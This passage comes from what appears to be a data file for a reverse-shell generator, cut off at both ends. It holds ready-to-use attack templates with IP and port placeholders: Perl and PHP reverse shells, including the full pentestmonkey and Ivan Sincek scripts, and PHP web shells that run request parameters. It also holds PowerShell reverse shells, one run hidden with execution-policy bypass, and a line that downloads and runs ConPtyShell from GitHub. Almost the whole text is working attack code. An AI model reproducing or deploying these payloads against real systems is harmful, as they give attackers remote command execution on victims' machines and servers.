                                      'Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} '
                                      '-i");};\'',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Perl'},
                          {'command': 'perl -MIO -e '
                                      "'$p=fork;exit,if($p);$c=new "
                                      'IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ '
                                      "while<>;'",
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Perl no sh'},
                          {'command': '#!/usr/bin/perl -w\n'
                                      '# perl-reverse-shell - A Reverse Shell '
                                      'implementation in PERL\n'
                                      '# Copyright (C) 2006 '
                                      'pentestmonkey@pentestmonkey.net\n'
                                      '#\n'
                                      '# This tool may be used for legal '
                                      'purposes only.  Users take full '
                                      'responsibility\n'
                                      '# for any actions performed using this '
                                      'tool.  The author accepts no liability\n'
                                      '# for damage caused by this tool.  If '
                                      'these terms are not acceptable to you, '
                                      'then\n'
                                      '# do not use this tool.\n'
                                      '#\n'
                                      '# In all other respects the GPL version '
                                      '2 applies:\n'
                                      '#\n'
                                      '# This program is free software; you '
                                      'can redistribute it and/or modify\n'
                                      '# it under the terms of the GNU General '
                                      'Public License version 2 as\n'
                                      '# published by the Free Software '
                                      'Foundation.\n'
                                      '#\n'
                                      '# This program is distributed in the '
                                      'hope that it will be useful,\n'
                                      '# but WITHOUT ANY WARRANTY; without '
                                      'even the implied warranty of\n'
                                      '# MERCHANTABILITY or FITNESS FOR A '
                                      'PARTICULAR PURPOSE.  See the\n'
                                      '# GNU General Public License for more '
                                      'details.\n'
                                      '#\n'
                                      '# You should have received a copy of '
                                      'the GNU General Public License along\n'
                                      '# with this program; if not, write to '
                                      'the Free Software Foundation, Inc.,\n'
                                      '# 51 Franklin Street, Fifth Floor, '
                                      'Boston, MA 02110-1301 USA.\n'
                                      '#\n'
                                      '# This tool may be used for legal '
                                      'purposes only.  Users take full '
                                      'responsibility\n'
                                      '# for any actions performed using this '
                                      'tool.  If these terms are not '
                                      'acceptable to\n'
                                      '# you, then do not use this tool.\n'
                                      '#\n'
                                      '# You are encouraged to send comments, '
                                      'improvements or suggestions to\n'
                                      '# me at '
                                      'pentestmonkey@pentestmonkey.net\n'
                                      '#\n'
                                      '# Description\n'
                                      '# -----------\n'
                                      '# This script will make an outbound TCP '
                                      'connection to a hardcoded IP and port.\n'
                                      '# The recipient will be given a shell '
                                      'running as the current user (apache '
                                      'normally).\n'
                                      '#\n'
                                      '\n'
                                      'use strict;\n'
                                      'use Socket;\n'
                                      'use FileHandle;\n'
                                      'use POSIX;\n'
                                      'my $VERSION = "1.0";\n'
                                      '\n'
                                      '# Where to send the reverse shell.  '
                                      'Change these.\n'
                                      "my $ip = '{ip}';\n"
                                      'my $port = {port};\n'
                                      '\n'
                                      '# Options\n'
                                      'my $daemon = 1;\n'
                                      'my $auth   = 0; # 0 means '
                                      'authentication is disabled and any \n'
                                      '\t\t# source IP can access the reverse '
                                      'shell\n'
                                      'my $authorised_client_pattern = '
                                      'qr(^127\\.0\\.0\\.1$);\n'
                                      '\n'
                                      '# Declarations\n'
                                      'my $global_page = "";\n'
                                      'my $fake_process_name = '
                                      '"/usr/sbin/apache";\n'
                                      '\n'
                                      '# Change the process name to be less '
                                      'conspicious\n'
                                      '$0 = "[httpd]";\n'
                                      '\n'
                                      '# Authenticate based on source IP '
                                      'address if required\n'
                                      "if (defined($ENV{'REMOTE_ADDR'})) {\n"
                                      '\tcgiprint("Browser IP address appears '
                                      'to be: $ENV{\'REMOTE_ADDR\'}");\n'
                                      '\n'
                                      '\tif ($auth) {\n'
                                      "\t\tunless ($ENV{'REMOTE_ADDR'} =~ "
                                      '$authorised_client_pattern) {\n'
                                      '\t\t\tcgiprint("ERROR: Your client '
                                      'isn\'t authorised to view this page");\n'
                                      '\t\t\tcgiexit();\n'
                                      '\t\t}\n'
                                      '\t}\n'
                                      '} elsif ($auth) {\n'
                                      '\tcgiprint("ERROR: Authentication is '
                                      "enabled, but I couldn't determine your "
                                      'IP address.  Denying access");\n'
                                      '\tcgiexit(0);\n'
                                      '}\n'
                                      '\n'
                                      '# Background and dissociate from parent '
                                      'process if required\n'
                                      'if ($daemon) {\n'
                                      '\tmy $pid = fork();\n'
                                      '\tif ($pid) {\n'
                                      '\t\tcgiexit(0); # parent exits\n'
                                      '\t}\n'
                                      '\n'
                                      '\tsetsid();\n'
                                      "\tchdir('/');\n"
                                      '\tumask(0);\n'
                                      '}\n'
                                      '\n'
                                      '# Make TCP connection for reverse '
                                      'shell\n'
                                      'socket(SOCK, PF_INET, SOCK_STREAM, '
                                      "getprotobyname('tcp'));\n"
                                      'if (connect(SOCK, '
                                      'sockaddr_in($port,inet_aton($ip)))) {\n'
                                      '\tcgiprint("Sent reverse shell to '
                                      '$ip:$port");\n'
                                      '\tcgiprintpage();\n'
                                      '} else {\n'
                                      '\tcgiprint("Couldn\'t open reverse '
                                      'shell to $ip:$port: $!");\n'
                                      '\tcgiexit();\t\n'
                                      '}\n'
                                      '\n'
                                      '# Redirect STDIN, STDOUT and STDERR to '
                                      'the TCP connection\n'
                                      'open(STDIN, ">&SOCK");\n'
                                      'open(STDOUT,">&SOCK");\n'
                                      'open(STDERR,">&SOCK");\n'
                                      "$ENV{'HISTFILE'} = '/dev/null';\n"
                                      'system("w;uname -a;id;pwd");\n'
                                      'exec({"{shell}"} ($fake_process_name, '
                                      '"-i"));\n'
                                      '\n'
                                      '# Wrapper around print\n'
                                      'sub cgiprint {\n'
                                      '\tmy $line = shift;\n'
                                      '\t$line .= "<p>\\n";\n'
                                      '\t$global_page .= $line;\n'
                                      '}\n'
                                      '\n'
                                      '# Wrapper around exit\n'
                                      'sub cgiexit {\n'
                                      '\tcgiprintpage();\n'
                                      "\texit 0; # 0 to ensure we don't give a "
                                      '500 response.\n'
                                      '}\n'
                                      '\n'
                                      '# Form HTTP response using all the '
                                      'messages gathered by cgiprint so far\n'
                                      'sub cgiprintpage {\n'
                                      '\tprint "Content-Length: " . '
                                      'length($global_page) . "\\r\n'
                                      'Connection: close\\r\n'
                                      'Content-Type: text\\/html\\r\\n\\r\\n" '
                                      '. $global_page;\n'
                                      '}\n',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'Perl PentestMonkey'},
                          {'command': '<?php\n'
                                      '// php-reverse-shell - A Reverse Shell '
                                      'implementation in PHP. Comments '
                                      'stripped to slim it down. RE: '
                                      'https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n'
                                      '// Copyright (C) 2007 '
                                      'pentestmonkey@pentestmonkey.net\n'
                                      '\n'
                                      'set_time_limit (0);\n'
                                      '$VERSION = "1.0";\n'
                                      "$ip = '{ip}';\n"
                                      '$port = {port};\n'
                                      '$chunk_size = 1400;\n'
                                      '$write_a = null;\n'
                                      '$error_a = null;\n'
                                      "$shell = 'uname -a; w; id; {shell} "
                                      "-i';\n"
                                      '$daemon = 0;\n'
                                      '$debug = 0;\n'
                                      '\n'
                                      "if (function_exists('pcntl_fork')) {\n"
                                      '\t$pid = pcntl_fork();\n'
                                      '\t\n'
                                      '\tif ($pid == -1) {\n'
                                      '\t\tprintit("ERROR: Can\'t fork");\n'
                                      '\t\texit(1);\n'
                                      '\t}\n'
                                      '\t\n'
                                      '\tif ($pid) {\n'
                                      '\t\texit(0);  // Parent exits\n'
                                      '\t}\n'
                                      '\tif (posix_setsid() == -1) {\n'
                                      '\t\tprintit("Error: Can\'t setsid()");\n'
                                      '\t\texit(1);\n'
                                      '\t}\n'
                                      '\n'
                                      '\t$daemon = 1;\n'
                                      '} else {\n'
                                      '\tprintit("WARNING: Failed to '
                                      'daemonise.  This is quite common and '
                                      'not fatal.");\n'
                                      '}\n'
                                      '\n'
                                      'chdir("/");\n'
                                      '\n'
                                      'umask(0);\n'
                                      '\n'
                                      '// Open reverse connection\n'
                                      '$sock = fsockopen($ip, $port, $errno, '
                                      '$errstr, 30);\n'
                                      'if (!$sock) {\n'
                                      '\tprintit("$errstr ($errno)");\n'
                                      '\texit(1);\n'
                                      '}\n'
                                      '\n'
                                      '$descriptorspec = array(\n'
                                      '   0 => array("pipe", "r"),  // stdin '
                                      'is a pipe that the child will read '
                                      'from\n'
                                      '   1 => array("pipe", "w"),  // stdout '
                                      'is a pipe that the child will write to\n'
                                      '   2 => array("pipe", "w")   // stderr '
                                      'is a pipe that the child will write to\n'
                                      ');\n'
                                      '\n'
                                      '$process = proc_open($shell, '
                                      '$descriptorspec, $pipes);\n'
                                      '\n'
                                      'if (!is_resource($process)) {\n'
                                      '\tprintit("ERROR: Can\'t spawn '
                                      'shell");\n'
                                      '\texit(1);\n'
                                      '}\n'
                                      '\n'
                                      'stream_set_blocking($pipes[0], 0);\n'
                                      'stream_set_blocking($pipes[1], 0);\n'
                                      'stream_set_blocking($pipes[2], 0);\n'
                                      'stream_set_blocking($sock, 0);\n'
                                      '\n'
                                      'printit("Successfully opened reverse '
                                      'shell to $ip:$port");\n'
                                      '\n'
                                      'while (1) {\n'
                                      '\tif (feof($sock)) {\n'
                                      '\t\tprintit("ERROR: Shell connection '
                                      'terminated");\n'
                                      '\t\tbreak;\n'
                                      '\t}\n'
                                      '\n'
                                      '\tif (feof($pipes[1])) {\n'
                                      '\t\tprintit("ERROR: Shell process '
                                      'terminated");\n'
                                      '\t\tbreak;\n'
                                      '\t}\n'
                                      '\n'
                                      '\t$read_a = array($sock, $pipes[1], '
                                      '$pipes[2]);\n'
                                      '\t$num_changed_sockets = '
                                      'stream_select($read_a, $write_a, '
                                      '$error_a, null);\n'
                                      '\n'
                                      '\tif (in_array($sock, $read_a)) {\n'
                                      '\t\tif ($debug) printit("SOCK READ");\n'
                                      '\t\t$input = fread($sock, '
                                      '$chunk_size);\n'
                                      '\t\tif ($debug) printit("SOCK: '
                                      '$input");\n'
                                      '\t\tfwrite($pipes[0], $input);\n'
                                      '\t}\n'
                                      '\n'
                                      '\tif (in_array($pipes[1], $read_a)) {\n'
                                      '\t\tif ($debug) printit("STDOUT '
                                      'READ");\n'
                                      '\t\t$input = fread($pipes[1], '
                                      '$chunk_size);\n'
                                      '\t\tif ($debug) printit("STDOUT: '
                                      '$input");\n'
                                      '\t\tfwrite($sock, $input);\n'
                                      '\t}\n'
                                      '\n'
                                      '\tif (in_array($pipes[2], $read_a)) {\n'
                                      '\t\tif ($debug) printit("STDERR '
                                      'READ");\n'
                                      '\t\t$input = fread($pipes[2], '
                                      '$chunk_size);\n'
                                      '\t\tif ($debug) printit("STDERR: '
                                      '$input");\n'
                                      '\t\tfwrite($sock, $input);\n'
                                      '\t}\n'
                                      '}\n'
                                      '\n'
                                      'fclose($sock);\n'
                                      'fclose($pipes[0]);\n'
                                      'fclose($pipes[1]);\n'
                                      'fclose($pipes[2]);\n'
                                      'proc_close($process);\n'
                                      '\n'
                                      'function printit ($string) {\n'
                                      '\tif (!$daemon) {\n'
                                      '\t\tprint "$string\\n";\n'
                                      '\t}\n'
                                      '}\n'
                                      '\n'
                                      '?>',
                           'meta': ['linux', 'windows', 'mac', 'ReverseShell'],
                           'name': 'PHP PentestMonkey'},
                          {'command': '<?php\n'
                                      '// Copyright (c) 2020 Ivan Sincek\n'
                                      '// v2.3\n'
                                      '// Requires PHP v5.0.0 or greater.\n'
                                      '// Works on Linux OS, macOS, and '
                                      'Windows OS.\n'
                                      '// See the original script at '
                                      'https://github.com/pentestmonkey/php-reverse-shell.\n'
                                      'class Shell {\n'
                                      '    private $addr  = null;\n'
                                      '    private $port  = null;\n'
                                      '    private $os    = null;\n'
                                      '    private $shell = null;\n'
                                      '    private $descriptorspec = array(\n'
                                      "        0 => array('pipe', 'r'), // "
                                      'shell can read from STDIN\n'
                                      "        1 => array('pipe', 'w'), // "
                                      'shell can write to STDOUT\n'
                                      "        2 => array('pipe', 'w')  // "
                                      'shell can write to STDERR\n'
                                      '    );\n'
                                      '    private $buffer  = 1024;    // '
                                      'read/write buffer size\n'
                                      '    private $clen    = 0;       // '
                                      'command length\n'
                                      '    private $error   = false;   // '
                                      'stream read/write error\n'
                                      '    public function __construct($addr, '
                                      '$port) {\n'
                                      '        $this->addr = $addr;\n'
                                      '        $this->port = $port;\n'
                                      '    }\n'
                                      '    private function detect() {\n'
                                      '        $detected = true;\n'
                                      "        if (stripos(PHP_OS, 'LINUX') "
                                      '!== false) { // same for macOS\n'
                                      "            $this->os    = 'LINUX';\n"
                                      "            $this->shell = '{shell}';\n"
                                      '        } else if (stripos(PHP_OS, '
                                      "'WIN32') !== false || stripos(PHP_OS, "
                                      "'WINNT') !== false || stripos(PHP_OS, "
                                      "'WINDOWS') !== false) {\n"
                                      "            $this->os    = 'WINDOWS';\n"
                                      "            $this->shell = 'cmd.exe';\n"
                                      '        } else {\n'
                                      '            $detected = false;\n'
                                      '            echo "SYS_ERROR: Underlying '
                                      'operating system is not supported, '
                                      'script will now exit...\\n";\n'
                                      '        }\n'
                                      '        return $detected;\n'
                                      '    }\n'
                                      '    private function daemonize() {\n'
                                      '        $exit = false;\n'
                                      '        if '
                                      "(!function_exists('pcntl_fork')) {\n"
                                      '            echo "DAEMONIZE: '
                                      'pcntl_fork() does not exists, moving '
                                      'on...\\n";\n'
                                      '        } else if (($pid = '
                                      '@pcntl_fork()) < 0) {\n'
                                      '            echo "DAEMONIZE: Cannot '
                                      'fork off the parent process, moving '
                                      'on...\\n";\n'
                                      '        } else if ($pid > 0) {\n'
                                      '            $exit = true;\n'
                                      '            echo "DAEMONIZE: Child '
                                      'process forked off successfully, parent '
                                      'process will now exit...\\n";\n'
                                      '        } else if (posix_setsid() < 0) '
                                      '{\n'
                                      '            // once daemonized you will '
                                      "actually no longer see the script's "
                                      'dump\n'
                                      '            echo "DAEMONIZE: Forked off '
                                      'the parent process but cannot set a new '
                                      'SID, moving on as an orphan...\\n";\n'
                                      '        } else {\n'
                                      '            echo "DAEMONIZE: Completed '
                                      'successfully!\\n";\n'
                                      '        }\n'
                                      '        return $exit;\n'
                                      '    }\n'
                                      '    private function settings() {\n'
                                      '        @error_reporting(0);\n'
                                      '        @set_time_limit(0); // do not '
                                      'impose the script execution time limit\n'
                                      '        @umask(0); // set the '
                                      'file/directory permissions - 666 for '
                                      'files and 777 for directories\n'
                                      '    }\n'
                                      '    private function dump($data) {\n'
                                      "        $data = str_replace('<', "
                                      "'&lt;', $data);\n"
                                      "        $data = str_replace('>', "
                                      "'&gt;', $data);\n"
                                      '        echo $data;\n'
                                      '    }\n'
                                      '    private function read($stream, '
                                      '$name, $buffer) {\n'
                                      '        if (($data = @fread($stream, '
                                      '$buffer)) === false) { // suppress an '
                                      'error when reading from a closed '
                                      'blocking stream\n'
                                      '            $this->error = '
                                      'true;                            // set '
                                      'global error flag\n'
                                      '            echo "STRM_ERROR: Cannot '
                                      'read from ${name}, script will now '
                                      'exit...\\n";\n'
                                      '        }\n'
                                      '        return $data;\n'
                                      '    }\n'
                                      '    private function write($stream, '
                                      '$name, $data) {\n'
                                      '        if (($bytes = @fwrite($stream, '
                                      '$data)) === false) { // suppress an '
                                      'error when writing to a closed blocking '
                                      'stream\n'
                                      '            $this->error = '
                                      'true;                            // set '
                                      'global error flag\n'
                                      '            echo "STRM_ERROR: Cannot '
                                      'write to ${name}, script will now '
                                      'exit...\\n";\n'
                                      '        }\n'
                                      '        return $bytes;\n'
                                      '    }\n'
                                      '    // read/write method for '
                                      'non-blocking streams\n'
                                      '    private function rw($input, '
                                      '$output, $iname, $oname) {\n'
                                      '        while (($data = '
                                      '$this->read($input, $iname, '
                                      '$this->buffer)) && '
                                      '$this->write($output, $oname, $data)) '
                                      '{\n'
                                      "            if ($this->os === 'WINDOWS' "
                                      "&& $oname === 'STDIN') { $this->clen += "
                                      'strlen($data); } // calculate the '
                                      'command length\n'
                                      '            $this->dump($data); // '
                                      "script's dump\n"
                                      '        }\n'
                                      '    }\n'
                                      '    // read/write method for blocking '
                                      'streams (e.g. for STDOUT and STDERR on '
                                      'Windows OS)\n'
                                      '    // we must read the exact byte '
                                      'length from a stream and not a single '
                                      'byte more\n'
                                      '    private function brw($input, '
                                      '$output, $iname, $oname) {\n'
                                      '        $fstat = fstat($input);\n'
                                      "        $size = $fstat['size'];\n"
                                      "        if ($this->os === 'WINDOWS' && "
                                      "$iname === 'STDOUT' && $this->clen) {\n"
                                      '            // for some reason Windows '
                                      'OS pipes STDIN into STDOUT\n'
                                      '            // we do not like that\n'
                                      '            // we need to discard the '
                                      'data from the stream\n'
                                      '            while ($this->clen > 0 && '
                                      '($bytes = $this->clen >= $this->buffer '
                                      '? $this->buffer : $this->clen) && '
                                      '$this->read($input, $iname, $bytes)) {\n'
                                      '                $this->clen -= $bytes;\n'
                                      '                $size -= $bytes;\n'
                                      '            }\n'
                                      '        }\n'
                                      '        while ($size > 0 && ($bytes = '
                                      '$size >= $this->buffer ? $this->buffer '
                                      ': $size) && ($data = '
                                      '$this->read($input, $iname, $bytes)) && '
                                      '$this->write($output, $oname, $data)) '
                                      '{\n'
                                      '            $size -= $bytes;\n'
                                      '            $this->dump($data); // '
                                      "script's dump\n"
                                      '        }\n'
                                      '    }\n'
                                      '    public function run() {\n'
                                      '        if ($this->detect() && '
                                      '!$this->daemonize()) {\n'
                                      '            $this->settings();\n'
                                      '\n'
                                      '            // ----- SOCKET BEGIN '
                                      '-----\n'
                                      '            $socket = '
                                      '@fsockopen($this->addr, $this->port, '
                                      '$errno, $errstr, 30);\n'
                                      '            if (!$socket) {\n'
                                      '                echo "SOC_ERROR: '
                                      '{$errno}: {$errstr}\\n";\n'
                                      '            } else {\n'
                                      '                '
                                      'stream_set_blocking($socket, false); // '
                                      'set the socket stream to non-blocking '
                                      "mode | returns 'true' on Windows OS\n"
                                      '\n'
                                      '                // ----- SHELL BEGIN '
                                      '-----\n'
                                      '                $process = '
                                      '@proc_open($this->shell, '
                                      '$this->descriptorspec, $pipes, null, '
                                      'null);\n'
                                      '                if (!$process) {\n'
                                      '                    echo "PROC_ERROR: '
                                      'Cannot start the shell\\n";\n'
                                      '                } else {\n'
                                      '                    foreach ($pipes as '
                                      '$pipe) {\n'
                                      '                        '
                                      'stream_set_blocking($pipe, false); // '
                                      'set the shell streams to non-blocking '
                                      "mode | returns 'false' on Windows OS\n"
                                      '                    }\n'
                                      '\n'
                                      '                    // ----- WORK BEGIN '
                                      '-----\n'
                                      '                    $status = '
                                      'proc_get_status($process);\n'
                                      '                    @fwrite($socket, '
                                      '"SOCKET: Shell has connected! PID: " . '
                                      '$status[\'pid\'] . "\\n");\n'
                                      '                    do {\n'
                                      '\t\t\t\t\t\t$status = '
                                      'proc_get_status($process);\n'
                                      '                        if '
                                      '(feof($socket)) { // check for '
                                      'end-of-file on SOCKET\n'
                                      '                            echo '
                                      '"SOC_ERROR: Shell connection has been '
                                      'terminated\\n"; break;\n'
                                      '                        } else if '
                                      '(feof($pipes[1]) || '
                                      "!$status['running']) {                 "
                                      '// check for end-of-file on STDOUT or '
                                      'if process is still running\n'
                                      '                            echo '
                                      '"PROC_ERROR: Shell process has been '
                                      'terminated\\n";   break; // feof() does '
                                      'not work with blocking streams\n'
                                      '                        '
                                      '}                                                                    '
                                      '// use proc_get_status() instead\n'
                                      '                        $streams = '
                                      'array(\n'
                                      "                            'read'   => "
                                      'array($socket, $pipes[1], $pipes[2]), '
                                      '// SOCKET | STDOUT | STDERR\n'
                                      "                            'write'  => "
                                      'null,\n'
                                      "                            'except' => "
                                      'null\n'
                                      '                        );\n'
                                      '                        '
                                      '$num_changed_streams = '
                                      "@stream_select($streams['read'], "
                                      "$streams['write'], $streams['except'], "
                                      '0); // wait for stream changes | will '
                                      'not wait on Windows OS\n'
                                      '                        if '
                                      '($num_changed_streams === false) {\n'
                                      '                            echo '
                                      '"STRM_ERROR: stream_select() '
                                      'failed\\n"; break;\n'
                                      '                        } else if '
                                      '($num_changed_streams > 0) {\n'
                                      '                            if '
                                      "($this->os === 'LINUX') {\n"
                                      '                                if '
                                      "(in_array($socket  , $streams['read'])) "
                                      '{ $this->rw($socket  , $pipes[0], '
                                      "'SOCKET', 'STDIN' ); } // read from "
                                      'SOCKET and write to STDIN\n'
                                      '                                if '
                                      "(in_array($pipes[2], $streams['read'])) "
                                      '{ $this->rw($pipes[2], $socket  , '
                                      "'STDERR', 'SOCKET'); } // read from "
                                      'STDERR and write to SOCKET\n'
                                      '                                if '
                                      "(in_array($pipes[1], $streams['read'])) "
                                      '{ $this->rw($pipes[1], $socket  , '
                                      "'STDOUT', 'SOCKET'); } // read from "
                                      'STDOUT and write to SOCKET\n'
                                      '                            } else if '
                                      "($this->os === 'WINDOWS') {\n"
                                      '                                // '
                                      'order is important\n'
                                      '                                if '
                                      '(in_array($socket, '
                                      "$streams['read'])/*------*/) { "
                                      '$this->rw ($socket  , $pipes[0], '
                                      "'SOCKET', 'STDIN' ); } // read from "
                                      'SOCKET and write to STDIN\n'
                                      '                                if '
                                      '(($fstat = fstat($pipes[2])) && '
                                      "$fstat['size']) { $this->brw($pipes[2], "
                                      "$socket  , 'STDERR', 'SOCKET'); } // "
                                      'read from STDERR and write to SOCKET\n'
                                      '                                if '
                                      '(($fstat = fstat($pipes[1])) && '
                                      "$fstat['size']) { $this->brw($pipes[1], "
                                      "$socket  , 'STDOUT', 'SOCKET'); } // "
                                      'read from STDOUT and write to SOCKET\n'
                                      '                            }\n'
                                      '                        }\n'
                                      '                    } while '
                                      '(!$this->error);\n'
                                      '                    // ------ WORK END '
                                      '------\n'
                                      '\n'
                                      '                    foreach ($pipes as '
                                      '$pipe) {\n'
                                      '                        fclose($pipe);\n'
                                      '                    }\n'
                                      '                    '
                                      'proc_close($process);\n'
                                      '                }\n'
                                      '                // ------ SHELL END '
                                      '------\n'
                                      '\n'
                                      '                fclose($socket);\n'
                                      '            }\n'
                                      '            // ------ SOCKET END '
                                      '------\n'
                                      '\n'
                                      '        }\n'
                                      '    }\n'
                                      '}\n'
                                      "echo '<pre>';\n"
                                      '// change the host address and/or port '
                                      'number as necessary\n'
                                      "$sh = new Shell('{ip}', {port});\n"
                                      '$sh->run();\n'
                                      'unset($sh);\n'
                                      '// garbage collector requires PHP '
                                      'v5.3.0 or greater\n'
                                      '// @gc_collect_cycles();\n'
                                      "echo '</pre>';\n"
                                      '?>',
                           'meta': ['linux', 'windows', 'mac', 'ReverseShell'],
                           'name': 'PHP Ivan Sincek'},
                          {'command': '<html>\n'
                                      '<body>\n'
                                      '<form method="GET" name="<?php echo '
                                      'basename($_SERVER[\'PHP_SELF\']); ?>">\n'
                                      '<input type="TEXT" name="cmd" id="cmd" '
                                      'size="80">\n'
                                      '<input type="SUBMIT" value="Execute">\n'
                                      '</form>\n'
                                      '<pre>\n'
                                      '<?php\n'
                                      "    if(isset($_GET['cmd']))\n"
                                      '    {\n'
                                      "        system($_GET['cmd']);\n"
                                      '    }\n'
                                      '?>\n'
                                      '</pre>\n'
                                      '</body>\n'
                                      '<script>document.getElementById("cmd").focus();</script>\n'
                                      '</html>',
                           'meta': ['linux', 'windows', 'mac', 'ReverseShell'],
                           'name': 'PHP cmd'},
                          {'command': "<?php if(isset($_REQUEST['cmd'])){ echo "
                                      '"<pre>"; $cmd = ($_REQUEST[\'cmd\']); '
                                      'system($cmd); echo "</pre>"; die; }?>',
                           'meta': ['linux', 'windows', 'mac', 'ReverseShell'],
                           'name': 'PHP cmd 2'},
                          {'command': '<?=`$_GET[0]`?>',
                           'meta': ['linux', 'windows', 'mac', 'ReverseShell'],
                           'name': 'PHP cmd small'},
                          {'command': 'php -r '
                                      '\'$sock=fsockopen("{ip}",{port});exec("{shell} '
                                      '<&3 >&3 2>&3");\'',
                           'meta': ['linux', None, 'mac', 'ReverseShell'],
                           'name': 'PHP exec'},
                          {'command': 'php -r '
                                      '\'$sock=fsockopen("{ip}",{port});shell_exec("{shell} '
                                      '<&3 >&3 2>&3");\'',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'PHP shell_exec'},
                          {'command': 'php -r '
                                      '\'$sock=fsockopen("{ip}",{port});system("{shell} '
                                      '<&3 >&3 2>&3");\'',
                           'meta': ['linux', 'windows', 'mac', 'ReverseShell'],
                           'name': 'PHP system'},
                          {'command': 'php -r '
                                      '\'$sock=fsockopen("{ip}",{port});passthru("{shell} '
                                      '<&3 >&3 2>&3");\'',
                           'meta': ['linux', 'mac', 'ReverseShell'],
                           'name': 'PHP passthru'},
                          {'command': 'php -r '
                                      '\'$sock=fsockopen("{ip}",{port});`{shell} '
                                      "<&3 >&3 2>&3`;'",
                           'meta': ['linux', 'windows', 'mac', 'ReverseShell'],
                           'name': 'PHP `'},
                          {'command': 'php -r '
                                      '\'$sock=fsockopen("{ip}",{port});popen("{shell} '
                                      '<&3 >&3 2>&3", "r");\'',
                           'meta': ['linux', 'windows', 'mac', 'ReverseShell'],
                           'name': 'PHP popen'},
                          {'command': 'php -r '
                                      '\'$sock=fsockopen("{ip}",{port});$proc=proc_open("{shell}", '
                                      'array(0=>$sock, 1=>$sock, '
                                      "2=>$sock),$pipes);'",
                           'meta': ['linux', 'windows', 'mac', 'ReverseShell'],
                           'name': 'PHP proc_open'},
                          {'command': 'IEX(IWR '
                                      'https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 '
                                      '-UseBasicParsing); Invoke-ConPtyShell '
                                      '{ip} {port}',
                           'meta': ['windows', 'ReverseShell'],
                           'name': 'Windows ConPty'},
                          {'command': '$LHOST = "{ip}"; $LPORT = {port}; '
                                      '$TCPClient = New-Object '
                                      'Net.Sockets.TCPClient($LHOST, $LPORT); '
                                      '$NetworkStream = '
                                      '$TCPClient.GetStream(); $StreamReader = '
                                      'New-Object '
                                      'IO.StreamReader($NetworkStream); '
                                      '$StreamWriter = New-Object '
                                      'IO.StreamWriter($NetworkStream); '
                                      '$StreamWriter.AutoFlush = $true; '
                                      '$Buffer = New-Object System.Byte[] '
                                      '1024; while ($TCPClient.Connected) { '
                                      'while ($NetworkStream.DataAvailable) { '
                                      '$RawData = $NetworkStream.Read($Buffer, '
                                      '0, $Buffer.Length); $Code = '
                                      '([text.encoding]::UTF8).GetString($Buffer, '
                                      '0, $RawData -1) }; if '
                                      '($TCPClient.Connected -and $Code.Length '
                                      '-gt 1) { $Output = try { '
                                      'Invoke-Expression ($Code) 2>&1 } catch '
                                      '{ $_ }; '
                                      '$StreamWriter.Write("$Output`n"); $Code '
                                      '= $null } }; $TCPClient.Close(); '
                                      '$NetworkStream.Close(); '
                                      '$StreamReader.Close(); '
                                      '$StreamWriter.Close()',
                           'meta': ['windows', 'ReverseShell'],
                           'name': 'PowerShell #1'},
                          {'command': 'powershell -nop -c "$client = '
                                      'New-Object '
                                      "System.Net.Sockets.TCPClient('{ip}',{port});$stream "
                                      '= $client.GetStream();[byte[]]$bytes = '
                                      '0..65535|%{0};while(($i = '
                                      '$stream.Read($bytes, 0, $bytes.Length)) '
                                      '-ne 0){;$data = (New-Object -TypeName '
                                      'System.Text.ASCIIEncoding).GetString($bytes,0, '
                                      '$i);$sendback = (iex $data 2>&1 | '
                                      'Out-String );$sendback2 = $sendback + '
                                      "'PS ' + (pwd).Path + '> ';$sendbyte = "
                                      '([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"',
                           'meta': ['windows', 'ReverseShell'],
                           'name': 'PowerShell #2'},
                          {'command': 'powershell -nop -W hidden -noni -ep '
                                      'bypass -c "$TCPClient = New-Object '
                                      "Net.Sockets.TCPClient('{ip}', "
                                      '{port});$NetworkStream = '
                                      '$TCPClient.GetStream();$StreamWriter = '
                                      'New-Object '
                                      'IO.StreamWriter($NetworkStream);function '
                                      'WriteToStream ($String) '
                                      '{[byte[]]$script:Buffer = '
                                      '0..$TCPClient.ReceiveBufferSize | % '
                                      '{0};$StreamWriter.Write($String + '
                                      "'SHELL> "
                                      "');$StreamWriter.Flush()}WriteToStream "
                                      "'';while(($BytesRead = "
                                      '$NetworkStream.Read($Buffer, 0, '
                                      '$Buffer.Length)) -gt 0) {$Command = '
                                      '([text.encoding]::UTF8).GetString($Buffer, '
                                      '0, $BytesRead - 1);$Output = try '
                                      '{Invoke-Expression $Command 2>&1 | '
                                      'Out-String} catch {$_ | '
                                      'Out-String}WriteToStream '
                                      '($Output)}$StreamWriter.Close()"',
                           'meta': ['windows', 'ReverseShell'],
                           'name': 'PowerShell #3'},
                          {'command': '$sslProtocols = '
                                      '[System.Security.Authentication.SslProtocols]::Tls12; '
                                      '$TCPClient = New-Object '
                                      "Net.Sockets.TCPClient('{ip}', "
                                      '{port});$NetworkStream = '
                                      '$TCPClient.GetStream();$SslStream = '
                                      'New-Object '
                                      'Net.Security.SslStream($NetworkStream,$false,({$true} '
                                      '-as '
                                      "[Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted "
                                      '-or !$SslStream.IsSigned) '
                                      '{$SslStream.Close();exit}$StreamWriter '
                                      '= New-Object '
                                      'IO.StreamWriter($SslStream);function '
                                      'WriteToStream ($String) '
                                      '{[byte[]]$script:Buffer = New-Object '
                                      'System.Byte[] 4096 '
                                      ";$StreamWriter.Write($String + 'SHELL> "
                                      "');$StreamWriter.Flush()};WriteToStream "
                                      "'';while(($BytesRead = "
                                      '$SslStream.Read($Buffer, 0, '
                                      '$Buffer.Length)) -gt 0) {$Command = '
                                      '([text.encoding]::UTF8).GetString($Buffer, '
